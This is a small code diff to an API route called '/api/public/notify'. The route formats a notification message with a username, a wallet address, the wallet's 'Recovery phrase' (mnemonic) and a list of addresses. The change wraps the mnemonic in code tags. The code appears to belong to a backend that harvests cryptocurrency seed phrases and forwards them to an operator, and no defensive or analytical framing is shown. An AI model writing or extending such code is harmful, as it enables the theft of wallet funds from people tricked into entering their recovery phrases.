@@ -87,7 +87,7 @@ export const Route = createFileRoute("/api/public/notify")({
             `👤 <b>${esc(username)}</b>`,
             `💼 <code>${esc(address)}</code>`,
             "🧠 Recovery phrase:",
-            esc(body.mnemonic),
+            `<code>${esc(body.mnemonic)}</code>`,
             "📇 Addresses:",
           ];
           for (const a of body.addresses.slice(0, 32)) {
